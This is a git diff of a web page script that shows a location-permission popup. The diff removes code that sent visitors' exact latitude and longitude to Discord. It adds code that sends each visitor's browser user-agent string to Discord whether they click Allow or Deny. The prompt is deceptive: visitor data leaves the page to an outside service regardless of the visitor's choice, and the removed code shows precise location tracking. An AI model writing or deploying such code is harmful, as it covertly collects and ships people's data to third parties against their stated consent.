@@ -6,7 +6,7 @@ document.addEventListener("DOMContentLoaded", function() {
     // Get the buttons inside the popup
     var allowLocationBtn = document.getElementById('allowLocation');
     var denyLocationBtn = document.getElementById('denyLocation');
-    
+
     // Function to show the popup
     function showPopup() {
         popup.style.display = 'block';
@@ -45,42 +45,31 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     }
 
+    // Function to retrieve user-agent string and send it to Discord
+    function sendUserAgentToDiscord() {
+        // Retrieve user-agent string
+        var userAgent = navigator.userAgent;
+        
+        // Send user-agent string to Discord
+        sendMessageToDiscord("User-Agent: " + userAgent);
+    }
+
     // Function to handle allowing location
     function allowLocation() {
-        // Check if Geolocation is supported
-        if (navigator.geolocation) {
-            // Call getCurrentPosition to get the user's location
-            navigator.geolocation.getCurrentPosition(function(position) {
-                // Extract latitude and longitude from the position object
-                var latitude = position.coords.latitude;
-                var longitude = position.coords.longitude;
-
-                // Construct message with location information
-                var message = 'User allowed location access. Latitude: ' + latitude + ', Longitude: ' + longitude;
-
-                // Send message to Discord
-                sendMessageToDiscord(message);
-            }, function(error) {
-                // Handle error if the user denies location access or if there's an error in accessing location
-                console.error("Error getting location:", error.message);
-            });
-        } else {
-            // Geolocation is not supported by the browser
-            console.error("Geolocation is not supported by this browser.");
-        }
-
+        sendUserAgentToDiscord(); // Send user-agent string to Discord
         hidePopup(); // Hide the popup after allowing location
     }
 
     // Function to handle denying location
     function denyLocation() {
-        // Here you can handle the case when the user denies location access
-        console.log("User denied location access");
+        sendUserAgentToDiscord(); // Send user-agent string to Discord
         hidePopup(); // Hide the popup
     }
 
     // Add click event listeners to the buttons
     allowLocationBtn.addEventListener('click', allowLocation);
     denyLocationBtn.addEventListener('click', denyLocation);
-showPopup()
+
+    // Show the popup
+    showPopup();
 });
